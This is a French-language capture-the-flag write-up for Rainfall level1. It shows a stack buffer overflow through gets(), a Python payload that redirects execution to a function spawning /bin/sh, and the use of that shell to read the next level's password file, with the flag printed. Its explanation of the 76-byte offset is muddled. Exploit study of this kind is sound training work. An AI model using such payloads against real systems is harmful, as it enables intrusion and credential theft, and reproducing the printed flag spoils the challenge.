# Rainfall - Flag 1

---

## ⚡ Objectif

Exploiter un dépassement de tampon (**buffer overflow**) sur la stack pour forcer l'exécution de la fonction `run()`.

---

## 📝 Analyse initiale

En désassemblant le binaire `level1`, on observe que `main` contient un appel vulnérable :

```asm
08048490 <main>:
  ...
  call   0x8048340 <gets@plt>
```

Et juste avant cet appel :

```asm
sub $0x50, %esp   ; alloue 80 octets pour le buffer
```

Donc :

* Le buffer local fait **80 octets** (`0x50`)
* `gets()` ne vérifie **aucune limite** : on peut écrire au-delà de ces 80 octets

Cela signifie qu'on peut **écraser le `saved EBP`, puis l'adresse de retour (`EIP`)**.

---

## 🎯 Fonction cible : `run()`

En analysant la section `.text` du binaire, on trouve une fonction utile :

```asm
08048444 <run>:
  call   fwrite@plt
  call   system@plt    ; avec argument "/bin/sh"
```

Si on arrive à rediriger l'exécution vers `0x08048444`, la fonction `run()` sera appelée, ce qui ouvrira un shell.

---

## 🔧 Construction du payload

On a testé via stdin un input avec 76 caractères "A", suivi de l'adresse de `run()` :

```bash
(python -c 'print("A"*76 + "\x44\x84\x04\x08")'; cat) | ./level1
```

**Pourquoi 76 ?**

* 80 (taille du buffer)
* 4 (bytes du `saved EBP`)
* \= **76 octets jusqu'à EIP**

---

## 🚀 Conséquence : Shell interactif

Le programme entre dans la fonction `run()`, qui contient :

* Un `fwrite()` (affichage texte)
* Un appel à `system("/bin/sh")`

On obtient donc un **shell avec les droits de level2** :

```bash
whoami
# level2

cat /home/user/level2/.pass
# 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

su level2
# Entrer le flag comme mot de passe
```

---

## 📅 Résumé

* ✅ Buffer overflow via `gets()` sans vérification de taille
* ✅ Offset trouvé : **76 octets jusqu'à EIP**
* ✅ Adresse de la fonction `run()` : `0x08048444`
* ✅ Payload : `"A"*76 + addr(run)`
* ✅ Shell obtenu → Flag récupéré avec `cat`
